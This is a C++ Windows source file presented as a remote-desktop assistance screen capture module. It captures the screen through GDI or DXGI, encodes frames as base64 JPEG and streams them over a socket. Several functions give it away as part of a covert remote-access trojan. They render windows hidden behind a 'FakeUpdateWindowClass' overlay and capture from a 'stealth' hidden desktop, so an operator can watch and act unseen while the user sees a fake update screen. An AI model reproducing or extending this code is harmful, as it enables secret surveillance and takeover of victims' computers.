#include <algorithm>
#include <vector>
#include <map>
// screen_capture.cpp
// Remote desktop assistance tool - screen capture module.
// Captures the full virtual desktop (all monitors) and writes a 24-bit BMP file.

#include "screen_capture.h"
#include "hidden_desktop.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#ifndef NO_ERROR
#define NO_ERROR 0
#endif
#include <gdiplus.h>
#include <d3d11.h>
#include <dxgi1_2.h>
#include <iostream>
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")
#pragma comment(lib, "gdiplus.lib")
using namespace Gdiplus;

/**
 * Captures the entire virtual screen and saves it as a 24-bit BMP file.
 *
 * Steps:
 *  1. Obtain a screen DC with GetDC(NULL) and read screen dimensions
 *     via GetSystemMetrics() using SM_XVIRTUALSCREEN / SM_YVIRTUALSCREEN
 *     so multi-monitor setups are captured correctly.
 *  2. Create a compatible memory DC and bitmap with CreateCompatibleDC /
 *     CreateCompatibleBitmap.
 *  3. Copy the screen into the memory bitmap using BitBlt with SRCCOPY.
 *  4. Extract raw pixel bytes with GetDIBits (bottom-up, 24 bpp).
 *  5. Build BITMAPFILEHEADER + BITMAPINFOHEADER and write the BMP via
 *     CreateFile / WriteFile.
 *  6. Release all GDI objects and the screen DC.
 *
 * @param outputPath  Destination file path for the BMP
 * @return            TRUE on success, FALSE on any failure
 */
BOOL CaptureScreen(const char* outputPath) {
    // All declarations hoisted above any goto to avoid crossing-init errors
    BOOL             success         = FALSE;
    HDC              hScreenDC       = NULL;
    HDC              hMemDC          = NULL;
    HBITMAP          hBitmap         = NULL;
    HGDIOBJ          hOldBitmap      = NULL;
    BYTE*            pPixels         = NULL;
    HANDLE           hFile           = INVALID_HANDLE_VALUE;
    int              screenX         = 0;
    int              screenY         = 0;
    int              width           = 0;
    int              height          = 0;
    int              stride          = 0;
    int              scanLinesCopied = 0;
    DWORD            pixelSize       = 0;
    DWORD            fileSize        = 0;
    DWORD            written         = 0;
    BOOL             blitted         = FALSE;
    BITMAPINFOHEADER bi;
    BITMAPFILEHEADER bf;

    ZeroMemory(&bi, sizeof(bi));
    ZeroMemory(&bf, sizeof(bf));

    if (!outputPath || outputPath[0] == '\0') {
        printf("[!] CaptureScreen: invalid output path\n");
        return FALSE;
    }

    // ------------------------------------------------------------------ //
    //  1. Acquire screen DC and determine virtual screen dimensions
    // ------------------------------------------------------------------ //

    hScreenDC = GetDC(NULL);
    if (!hScreenDC) {
        printf("[!] GetDC(NULL) failed: %lu\n", GetLastError());
        goto cleanup;
    }

    // SM_XVIRTUALSCREEN / SM_CXVIRTUALSCREEN cover all monitors combined
    screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
    screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
    width   = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height  = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (width <= 0 || height <= 0) {
        width   = GetSystemMetrics(SM_CXSCREEN);
        height  = GetSystemMetrics(SM_CYSCREEN);
        screenX = 0;
        screenY = 0;
    }

    printf("[+] Capturing virtual screen: origin=(%d,%d) size=%dx%d\n",
           screenX, screenY, width, height);

    // ------------------------------------------------------------------ //
    //  2. Create a compatible memory DC and a compatible bitmap
    // ------------------------------------------------------------------ //

    hMemDC = CreateCompatibleDC(hScreenDC);
    if (!hMemDC) {
        printf("[!] CreateCompatibleDC failed: %lu\n", GetLastError());
        goto cleanup;
    }

    // Must reference the SCREEN DC so colour depth matches the display
    hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        printf("[!] CreateCompatibleBitmap failed: %lu\n", GetLastError());
        goto cleanup;
    }

    hOldBitmap = SelectObject(hMemDC, hBitmap);

    // ------------------------------------------------------------------ //
    //  3. BitBlt -- copy the live screen into the memory DC
    // ------------------------------------------------------------------ //

    // CAPTUREBLT includes layered/transparent windows
    blitted = BitBlt(
        hMemDC, 0, 0, width, height,
        hScreenDC, screenX, screenY,
        SRCCOPY
    );

    SelectObject(hMemDC, hOldBitmap);   // restore before GetDIBits

    if (!blitted) {
        printf("[!] BitBlt failed: %lu\n", GetLastError());
        goto cleanup;
    }

    // ------------------------------------------------------------------ //
    //  4. Extract raw pixel data with GetDIBits (24 bpp, bottom-up)
    // ------------------------------------------------------------------ //

    stride    = ((width * 3) + 3) & ~3;       // DWORD-aligned row stride
    pixelSize = (DWORD)(stride * height);

    pPixels = (BYTE*)malloc(pixelSize);
    if (!pPixels) {
        printf("[!] malloc failed for pixel buffer (%lu bytes)\n", pixelSize);
        goto cleanup;
    }
    ZeroMemory(pPixels, pixelSize);

    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth       = width;
    bi.biHeight      = height;   // positive = bottom-up (standard BMP)
    bi.biPlanes      = 1;
    bi.biBitCount    = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage   = pixelSize;

    // Re-select bitmap so GetDIBits can read from it
    hOldBitmap = SelectObject(hMemDC, hBitmap);

    scanLinesCopied = GetDIBits(
        hMemDC, hBitmap,
        0, (UINT)height,
        pPixels,
        (BITMAPINFO*)&bi,
        DIB_RGB_COLORS
    );

    SelectObject(hMemDC, hOldBitmap);

    if (scanLinesCopied == 0) {
        printf("[!] GetDIBits failed: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] GetDIBits copied %d scan lines\n", scanLinesCopied);

    // ------------------------------------------------------------------ //
    //  5. Build BMP file headers and write to disk via CreateFile/WriteFile
    // ------------------------------------------------------------------ //

    fileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pixelSize;

    bf.bfType      = 0x4D42;                                             // 'BM'
    bf.bfSize      = fileSize;
    bf.bfReserved1 = 0;
    bf.bfReserved2 = 0;
    bf.bfOffBits   = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    hFile = CreateFileA(
        outputPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFile failed for '%s': %lu\n", outputPath, GetLastError());
        goto cleanup;
    }

    // Write BITMAPFILEHEADER
    if (!WriteFile(hFile, &bf, sizeof(bf), &written, NULL) || written != sizeof(bf)) {
        printf("[!] WriteFile (BITMAPFILEHEADER) failed: %lu\n", GetLastError());
        goto cleanup;
    }

    // Write BITMAPINFOHEADER
    written = 0;
    if (!WriteFile(hFile, &bi, sizeof(bi), &written, NULL) || written != sizeof(bi)) {
        printf("[!] WriteFile (BITMAPINFOHEADER) failed: %lu\n", GetLastError());
        goto cleanup;
    }

    // Write raw pixel data
    written = 0;
    if (!WriteFile(hFile, pPixels, pixelSize, &written, NULL) || written != pixelSize) {
        printf("[!] WriteFile (pixel data) failed: %lu\n", GetLastError());
        goto cleanup;
    }

    success = TRUE;

    // ------------------------------------------------------------------ //
    //  6. Release all resources
    // ------------------------------------------------------------------ //

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (pPixels)                        free(pPixels);
    if (hBitmap)                        DeleteObject(hBitmap);
    if (hMemDC)                         DeleteDC(hMemDC);
    if (hScreenDC)                      ReleaseDC(NULL, hScreenDC);

    return success;
}

BOOL CaptureScreenForOCR(const char* outputPath) {
    HDC hScreenDC = NULL;
    HDC hMemDC = NULL;
    HBITMAP hBitmap = NULL;
    HGDIOBJ hOldBitmap = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BYTE* pixelData = NULL;
    BOOL success = FALSE;
    int width = 0;
    int height = 0;
    int stride = 0;
    DWORD imageSize = 0;
    DWORD written = 0;
    BITMAPINFOHEADER bi;
    BITMAPFILEHEADER bf;

    if (!outputPath || outputPath[0] == '\0') {
        SetLastError(87); // ERROR_INVALID_PARAMETER
        return FALSE;
    }

    ZeroMemory(&bi, sizeof(bi));
    ZeroMemory(&bf, sizeof(bf));

    hScreenDC = GetDC(NULL);
    if (!hScreenDC) goto cleanup;

    width = GetSystemMetrics(SM_CXSCREEN);
    height = GetSystemMetrics(SM_CYSCREEN);
    if (width <= 0 || height <= 0) {
        SetLastError(13); // ERROR_INVALID_DATA
        goto cleanup;
    }

    hMemDC = CreateCompatibleDC(hScreenDC);
    if (!hMemDC) goto cleanup;

    hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) goto cleanup;

    hOldBitmap = SelectObject(hMemDC, hBitmap);
    if (!hOldBitmap) goto cleanup;

    if (!BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) goto cleanup;

    stride = ((width * 3) + 3) & ~3;
    imageSize = (DWORD)(stride * height);
    pixelData = (BYTE*)malloc(imageSize);
    if (!pixelData) {
        SetLastError(14); // ERROR_OUTOFMEMORY
        goto cleanup;
    }

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = imageSize;

    if (GetDIBits(hMemDC, hBitmap, 0, (UINT)height, pixelData, (BITMAPINFO*)&bi, DIB_RGB_COLORS) == 0) goto cleanup;

    bf.bfType = 0x4D42;
    bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bf.bfSize = bf.bfOffBits + imageSize;

    hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto cleanup;

    if (!WriteFile(hFile, &bf, sizeof(bf), &written, NULL) || written != sizeof(bf)) goto cleanup;
    if (!WriteFile(hFile, &bi, sizeof(bi), &written, NULL) || written != sizeof(bi)) goto cleanup;
    if (!WriteFile(hFile, pixelData, imageSize, &written, NULL) || written != imageSize) goto cleanup;

    success = TRUE;

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (pixelData) free(pixelData);
    if (hOldBitmap) SelectObject(hMemDC, hOldBitmap);
    if (hBitmap) DeleteObject(hBitmap);
    if (hMemDC) DeleteDC(hMemDC);
    if (hScreenDC) ReleaseDC(NULL, hScreenDC);
    return success;
}

// Global variables for screenshot streaming
static volatile BOOL g_streaming = FALSE;
static SOCKET g_streamSocket = INVALID_SOCKET;
static HANDLE g_streamThread = NULL;
static int g_streamFPS = 5;
static int g_streamQuality = 70;
static int g_streamMaxWidth = 1280;
static int g_streamMaxHeight = 720;

static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

static inline std::string base64_encode(const unsigned char* bytes_to_encode, unsigned int in_len) {
  std::string ret;
  int i = 0, j = 0;
  unsigned char char_array_3[3];
  unsigned char char_array_4[4];

  ret.reserve((in_len + 2) / 3 * 4); // Pre-allocate

  while (in_len--) {
    char_array_3[i++] = *(bytes_to_encode++);
    if (i == 3) {
      char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
      char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
      char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
      char_array_4[3] = char_array_3[2] & 0x3f;

      for(i = 0; i < 4; i++) ret += base64_chars[char_array_4[i]];
      i = 0;
    }
  }

  if (i) {
    for(j = i; j < 3; j++) char_array_3[j] = '\0';
    char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
    char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
    char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
    char_array_4[3] = char_array_3[2] & 0x3f;
    for (j = 0; j < i + 1; j++) ret += base64_chars[char_array_4[j]];
    while((i++ < 3)) ret += '=';
  }
  return ret;
}

// Helper function to compress bitmap to JPEG
std::string CompressBitmapToJPEG(HBITMAP hBitmap, int quality, int maxWidth, int maxHeight) {
    std::string result;
    
    // TODO: Implement JPEG compression using GDI+ or stb_image_write
    // For now, return empty string (placeholder)
    
    return result;
}

// Thread function for continuous screenshot streaming
// Helper function to get encoder CLSID
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if(size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if(pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for(UINT j = 0; j < num; ++j) {
        if(wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

std::string CaptureScreenToJPEG_GDI(int quality, int maxWidth, int maxHeight) {
    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) return "";

    int screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (width <= 0) width = GetSystemMetrics(SM_CXSCREEN);
    if (height <= 0) height = GetSystemMetrics(SM_CYSCREEN);
    if (width <= 0 || height <= 0) { ReleaseDC(NULL, hScreenDC); return ""; }

    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);

    if (!hMemDC || !hBitmap) {
        if (hBitmap) DeleteObject(hBitmap);
        if (hMemDC) DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);
        return "";
    }

    HGDIOBJ hOldBitmap = SelectObject(hMemDC, hBitmap);

    // --- Flicker-free, cached capture behind fake update overlay ---
    // Per-window bitmap cache: only re-render a window if it is dirty (has a
    // pending update region) or has moved/resized since last frame.
    // Clean windows are blitted straight from their cached bitmap — skipping
    // the expensive PrintWindow call entirely for unchanged content.
    // On a typical desktop this reduces PrintWindow calls from ~20-30/frame
    // down to 1-3/frame (only the actively changing windows).
    struct WndCache {
        HBITMAP bmp;   // cached bitmap for this window
        int     w, h;  // dimensions the bitmap was rendered at
        RECT    wr;    // last known window rect
    };
    static std::map<HWND, WndCache> s_wndCache;
    static HDC s_cacheDC = NULL;
    if (!s_cacheDC) s_cacheDC = CreateCompatibleDC(hScreenDC);

    HWND hFakeUpdate = FindWindowA("FakeUpdateWindowClass", NULL);
    bool onStealthDesktop = (GetCurrentDesktopMode() == DESKTOP_STEALTH);

    // On stealth desktop, GetDC(NULL) captures black (no physical display).
    // Force the per-window PrintWindow loop even without the fake update overlay.
    if (hFakeUpdate || onStealthDesktop) {
        // Fill background first so gaps between windows don't show garbage
        RECT fullRect = {0, 0, width, height};
        FillRect(hMemDC, &fullRect, (HBRUSH)GetStockObject(BLACK_BRUSH));

        // Collect Z-order below the overlay (topmost first, reversed when painting).
        // On stealth desktop, hFakeUpdate is NULL — enumerate all top-level windows
        // via GetTopWindow(GetDesktopWindow()) instead.
        std::vector<HWND> toRender;
        HWND hStart = hFakeUpdate ? hFakeUpdate : GetTopWindow(GetDesktopWindow());
        for (HWND h = GetWindow(hStart, GW_HWNDNEXT); h != NULL; h = GetWindow(h, GW_HWNDNEXT)) {
            if (IsWindowVisible(h)) toRender.push_back(h);
        }

        // Remove stale cache entries for windows that no longer exist
        for (auto it = s_wndCache.begin(); it != s_wndCache.end(); ) {
            if (!IsWindow(it->first)) {
                if (it->second.bmp) DeleteObject(it->second.bmp);
                it = s_wndCache.erase(it);
            } else {
                ++it;
            }
        }

        // Paint bottom-to-top
        for (int i = (int)toRender.size() - 1; i >= 0; i--) {
            HWND h = toRender[i];
            RECT wr;
            if (!GetWindowRect(h, &wr)) continue;
            int ww = wr.right  - wr.left;
            int wh = wr.bottom - wr.top;
            if (ww <= 0 || wh <= 0) continue;

            int destX = wr.left - screenX;
            int destY = wr.top  - screenY;

            // Decide if we need a fresh PrintWindow call:
            //   1. Window not in cache yet
            //   2. Window moved or resized
            //   3. Window has a pending paint/update region (GetUpdateRect)
            bool needRender = false;
            auto cit = s_wndCache.find(h);
            if (cit == s_wndCache.end()) {
                needRender = true;          // first time we've seen this window
            } else {
                WndCache& c = cit->second;
                if (c.w != ww || c.h != wh ||
                    c.wr.left != wr.left || c.wr.top != wr.top) {
                    needRender = true;      // window moved or resized
                } else if (GetUpdateRect(h, NULL, FALSE)) {
                    needRender = true;      // window has dirty pixels to repaint
                }
            }

            if (needRender) {
                // (Re)allocate cached bitmap if dimensions changed
                WndCache& c = s_wndCache[h];
                if (c.bmp && (c.w != ww || c.h != wh)) {
                    DeleteObject(c.bmp);
                    c.bmp = NULL;
                }
                if (!c.bmp) {
                    c.bmp = CreateCompatibleBitmap(hScreenDC, ww, wh);
                    c.w   = ww;
                    c.h   = wh;
                }
                c.wr = wr;

                if (c.bmp) {
                    HGDIOBJ hOld = SelectObject(s_cacheDC, c.bmp);

                    // Freeze fix: before calling PrintWindow, probe the window with
                    // a cheap WM_NULL ping using SendMessageTimeout.
                    // - PrintWindow(PW_RENDERFULLCONTENT) MUST be used (not WM_PRINT)
                    //   because PW_RENDERFULLCONTENT is the only way to capture
                    //   DWM/GPU-composited windows (Chrome, modern apps etc).
                    //   Using raw WM_PRINT loses that flag and renders them black.
                    // - The ping tells us if the window's message loop is free.
                    //   If it responds within 40ms we know PrintWindow will complete
                    //   quickly too. If it doesn't respond we leave the stale cached
                    //   bitmap in place and skip — no freeze, 1 frame stale at worst.
                    DWORD_PTR pingResult = 0;
                    LRESULT alive = SendMessageTimeout(
                        h, WM_NULL, 0, 0,
                        SMTO_ABORTIFHUNG | SMTO_BLOCK,
                        40,   // 40 ms ping timeout
                        &pingResult
                    );
                    if (alive) {
                        // Window is responsive — PrintWindow will not block
                        PrintWindow(h, s_cacheDC, 0x2 /* PW_RENDERFULLCONTENT */);
                    }
                    // else: window is busy/hung — keep stale cache, stream continues

                    SelectObject(s_cacheDC, hOld);
                }
            }

            // Blit from cache (fresh or stale-but-unchanged) into composite
            WndCache& c = s_wndCache[h];
            if (c.bmp) {
                HGDIOBJ hOld = SelectObject(s_cacheDC, c.bmp);
                BitBlt(hMemDC, destX, destY, ww, wh, s_cacheDC, 0, 0, SRCCOPY);
                SelectObject(s_cacheDC, hOld);
            }
        }
    } else {
        // No fake update running — normal single-BitBlt fast path
        BitBlt(hMemDC, 0, 0, width, height, hScreenDC, screenX, screenY, SRCCOPY);
    }
    // --- End cached capture ---

    std::string b64Result = "";

    // Convert HBITMAP to Gdiplus::Bitmap
    Bitmap* pBitmap = new Bitmap(hBitmap, NULL);
    
    // Resize if requested
    Bitmap* pFinalBitmap = pBitmap;
    if ((maxWidth > 0 && width > maxWidth) || (maxHeight > 0 && height > maxHeight)) {
        float ratioX = (float)maxWidth / width;
        float ratioY = (float)maxHeight / height;
        float ratio = std::min(ratioX, ratioY);
        int newWidth = (int)(width * ratio);
        int newHeight = (int)(height * ratio);
        pFinalBitmap = new Bitmap(newWidth, newHeight, pBitmap->GetPixelFormat());
        Graphics* graphics = new Graphics(pFinalBitmap);
        graphics->DrawImage(pBitmap, 0, 0, newWidth, newHeight);
        delete graphics;
    }

    // Save to IStream
    IStream* pStream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == 0 /* S_OK */) {
        CLSID jpegClsid;
        if(GetEncoderClsid(L"image/jpeg", &jpegClsid) != -1) {
            EncoderParameters encoderParameters;
            encoderParameters.Count = 1;
            encoderParameters.Parameter[0].Guid = EncoderQuality;
            encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
            encoderParameters.Parameter[0].NumberOfValues = 1;
            ULONG qual = quality;
            encoderParameters.Parameter[0].Value = &qual;

            if (pFinalBitmap->Save(pStream, &jpegClsid, &encoderParameters) == Ok) {
                LARGE_INTEGER liZero = {};
                ULARGE_INTEGER pos = {};
                pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
                
                STATSTG stg = {};
                pStream->Stat(&stg, STATFLAG_NONAME);
                
                ULONG streamSize = stg.cbSize.LowPart;
                BYTE* buffer = new BYTE[streamSize];
                ULONG bytesRead = 0;
                pStream->Read(buffer, streamSize, &bytesRead);
                
                b64Result = base64_encode(buffer, streamSize);
                delete[] buffer;
            }
        }
        pStream->Release();
    }
    
    if (pFinalBitmap != pBitmap) {
        delete pFinalBitmap;
    }
    delete pBitmap;

    SelectObject(hMemDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreenDC);

    return b64Result;
}


static ID3D11Device* g_d3dDevice = NULL;
static ID3D11DeviceContext* g_d3dContext = NULL;
static IDXGIOutputDuplication* g_deskDupl = NULL;

void CleanupDXGI() {
    if (g_deskDupl) { g_deskDupl->Release(); g_deskDupl = NULL; }
    if (g_d3dContext) { g_d3dContext->Release(); g_d3dContext = NULL; }
    if (g_d3dDevice) { g_d3dDevice->Release(); g_d3dDevice = NULL; }
}

bool InitDXGI() {
    if (g_deskDupl) return true;

    HRESULT hr = D3D11CreateDevice(NULL, D3D_DRIVER_TYPE_HARDWARE, NULL, 0, NULL, 0, D3D11_SDK_VERSION, &g_d3dDevice, NULL, &g_d3dContext);
    if (FAILED(hr)) return false;

    IDXGIDevice* dxgiDevice = NULL;
    hr = g_d3dDevice->QueryInterface(__uuidof(IDXGIDevice), (void**)&dxgiDevice);
    if (FAILED(hr)) { CleanupDXGI(); return false; }

    IDXGIAdapter* dxgiAdapter = NULL;
    hr = dxgiDevice->GetParent(__uuidof(IDXGIAdapter), (void**)&dxgiAdapter);
    dxgiDevice->Release();
    if (FAILED(hr)) { CleanupDXGI(); return false; }

    IDXGIOutput* dxgiOutput = NULL;
    hr = dxgiAdapter->EnumOutputs(0, &dxgiOutput);
    dxgiAdapter->Release();
    if (FAILED(hr)) { CleanupDXGI(); return false; }

    IDXGIOutput1* dxgiOutput1 = NULL;
    hr = dxgiOutput->QueryInterface(__uuidof(IDXGIOutput1), (void**)&dxgiOutput1);
    dxgiOutput->Release();
    if (FAILED(hr)) { CleanupDXGI(); return false; }

    hr = dxgiOutput1->DuplicateOutput(g_d3dDevice, &g_deskDupl);
    dxgiOutput1->Release();
    if (FAILED(hr)) { CleanupDXGI(); return false; }

    return true;
}

std::string CaptureScreenToJPEG_DXGI(int quality, int maxWidth, int maxHeight) {
    if (!InitDXGI()) {
        return CaptureScreenToJPEG_GDI(quality, maxWidth, maxHeight);
    }

    IDXGIResource* desktopResource = NULL;
    DXGI_OUTDUPL_FRAME_INFO frameInfo;
    HRESULT hr = g_deskDupl->AcquireNextFrame(250, &frameInfo, &desktopResource);
    if (FAILED(hr)) {
        if (hr == DXGI_ERROR_ACCESS_LOST) { CleanupDXGI(); }
        return "";
    }

    ID3D11Texture2D* desktopImage = NULL;
    hr = desktopResource->QueryInterface(__uuidof(ID3D11Texture2D), (void**)&desktopImage);
    desktopResource->Release();
    if (FAILED(hr)) { g_deskDupl->ReleaseFrame(); return ""; }

    D3D11_TEXTURE2D_DESC desc;
    desktopImage->GetDesc(&desc);

    desc.Usage = D3D11_USAGE_STAGING;
    desc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
    desc.BindFlags = 0;
    desc.MiscFlags = 0;
    desc.MipLevels = 1;
    desc.ArraySize = 1;

    ID3D11Texture2D* stagingImage = NULL;
    hr = g_d3dDevice->CreateTexture2D(&desc, NULL, &stagingImage);
    if (FAILED(hr)) {
        desktopImage->Release();
        g_deskDupl->ReleaseFrame();
        return "";
    }

    g_d3dContext->CopyResource(stagingImage, desktopImage);
    desktopImage->Release();
    g_deskDupl->ReleaseFrame();

    D3D11_MAPPED_SUBRESOURCE map;
    hr = g_d3dContext->Map(stagingImage, 0, D3D11_MAP_READ, 0, &map);
    if (FAILED(hr)) { stagingImage->Release(); return ""; }

    // Use PixelFormat32bppRGB to ignore alpha. If alpha is 0 from DXGI, ARGB will render transparent.
    Bitmap* pBitmap = new Bitmap(desc.Width, desc.Height, map.RowPitch, PixelFormat32bppRGB, (BYTE*)map.pData);
    std::string b64Result = "";

    Bitmap* pFinalBitmap = pBitmap;
    if ((maxWidth > 0 && desc.Width > (UINT)maxWidth) || (maxHeight > 0 && desc.Height > (UINT)maxHeight)) {
        float ratioX = (float)maxWidth / desc.Width;
        float ratioY = (float)maxHeight / desc.Height;
        float ratio = std::min(ratioX, ratioY);
        int newWidth = (int)(desc.Width * ratio);
        int newHeight = (int)(desc.Height * ratio);
        pFinalBitmap = new Bitmap(newWidth, newHeight, pBitmap->GetPixelFormat());
        Graphics* graphics = new Graphics(pFinalBitmap);
        graphics->DrawImage(pBitmap, 0, 0, newWidth, newHeight);
        delete graphics;
    }

    IStream* pStream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == 0 /* S_OK */) {
        CLSID jpegClsid;
        if(GetEncoderClsid(L"image/jpeg", &jpegClsid) != -1) {
            EncoderParameters encoderParameters;
            encoderParameters.Count = 1;
            encoderParameters.Parameter[0].Guid = EncoderQuality;
            encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
            encoderParameters.Parameter[0].NumberOfValues = 1;
            ULONG qual = quality;
            encoderParameters.Parameter[0].Value = &qual;

            if (pFinalBitmap->Save(pStream, &jpegClsid, &encoderParameters) == Ok) {
                LARGE_INTEGER liZero = {};
                ULARGE_INTEGER pos = {};
                pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
                STATSTG stg = {};
                pStream->Stat(&stg, STATFLAG_NONAME);
                ULONG streamSize = stg.cbSize.LowPart;
                BYTE* buffer = new BYTE[streamSize];
                ULONG bytesRead = 0;
                pStream->Read(buffer, streamSize, &bytesRead);
                b64Result = base64_encode(buffer, streamSize);
                delete[] buffer;
            }
        }
        pStream->Release();
    }

    if (pFinalBitmap != pBitmap) delete pFinalBitmap;
    delete pBitmap;

    g_d3dContext->Unmap(stagingImage, 0);
    stagingImage->Release();

    return b64Result;
}

std::string CaptureScreenToJPEG(int quality, int maxWidth, int maxHeight) {
    // If the fake update screen is running, force GDI capture to bypass the layered window
    if (FindWindowA("FakeUpdateWindowClass", NULL)) {
        return CaptureScreenToJPEG_GDI(quality, maxWidth, maxHeight);
    }
    // If we're on the stealth (hidden) desktop, DXGI won't work — it only captures
    // the physical display output. Fall back to GDI which respects SetThreadDesktop().
    if (GetCurrentDesktopMode() == DESKTOP_STEALTH) {
        return CaptureScreenToJPEG_GDI(quality, maxWidth, maxHeight);
    }
    return CaptureScreenToJPEG_DXGI(quality, maxWidth, maxHeight);
}

DWORD WINAPI ScreenshotStreamThread(LPVOID lpParam) {

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    while (g_streaming) {
        std::string jpegData = CaptureScreenToJPEG(g_streamQuality, g_streamMaxWidth, g_streamMaxHeight);

        if (!jpegData.empty() && g_streamSocket != INVALID_SOCKET) {
            std::string header = "SCREENSHOT_STREAM|" + std::to_string(jpegData.size()) + "|";
            std::string message = header + jpegData + "\n";

            int totalSent = 0;
            int length = message.size();
            while (totalSent < length) {
                int bytesSent = send(g_streamSocket, message.c_str() + totalSent, length - totalSent, 0);
                if (bytesSent <= 0) {
                    g_streaming = FALSE;
                    break;
                }
                totalSent += bytesSent;
            }
        }

        int sleepTime = 1000 / g_streamFPS;
        if (sleepTime < 16) sleepTime = 16; // Max ~60 FPS
        Sleep(sleepTime);
    }

    // Shutdown GDI+
    GdiplusShutdown(gdiplusToken);
    return 0;
}

BOOL StartScreenshotStream(SOCKET sock, int fps, int quality, int maxWidth, int maxHeight) {
    if (g_streaming) {
        return FALSE; // Already streaming
    }

    if (fps < 1) fps = 1;
    if (fps > 60) fps = 60;
    if (quality < 1) quality = 1;
    if (quality > 100) quality = 100;

    g_streamSocket = sock;
    g_streamFPS = fps;
    g_streamQuality = quality;
    g_streamMaxWidth = maxWidth;
    g_streamMaxHeight = maxHeight;
    g_streaming = TRUE;

    g_streamThread = CreateThread(NULL, 0, ScreenshotStreamThread, NULL, 0, NULL);
    if (g_streamThread == NULL) {
        g_streaming = FALSE;
        g_streamSocket = INVALID_SOCKET;
        return FALSE;
    }

    return TRUE;
}

void StopScreenshotStream() {
    g_streaming = FALSE;

    if (g_streamThread) {
        // Wait up to 3 seconds for the thread to exit cleanly
        DWORD waitResult = WaitForSingleObject(g_streamThread, 3000);
        if (waitResult == WAIT_TIMEOUT) {
            // Thread is stuck in DXGI (AcquireNextFrame deadlock on hidden desktop).
            // Force-kill it to prevent the main thread from freezing.
            std::cout << "[STREAM] Stream thread timed out, terminating...\n";
            TerminateThread(g_streamThread, 0);
            // WARNING: TerminateThread leaves DXGI internal locks abandoned.
            // Calling CleanupDXGI() here would deadlock because Release() tries
            // to acquire those same abandoned locks. Instead, we leak the DXGI
            // objects — they'll be cleaned up on process exit. The next call to
            // StartScreenshotStream will re-initialize fresh DXGI objects.
            // Skip CleanupDXGI() after TerminateThread.
            std::cout << "[STREAM] Skipping DXGI cleanup (abandoned locks)\n";
        } else {
            // Thread exited cleanly — safe to release DXGI resources
            CleanupDXGI();
        }
        CloseHandle(g_streamThread);
        g_streamThread = NULL;
        std::cout << "[STREAM] Stream stopped\n";
    }
}

BOOL IsScreenshotStreaming() {
    return g_streaming;
}
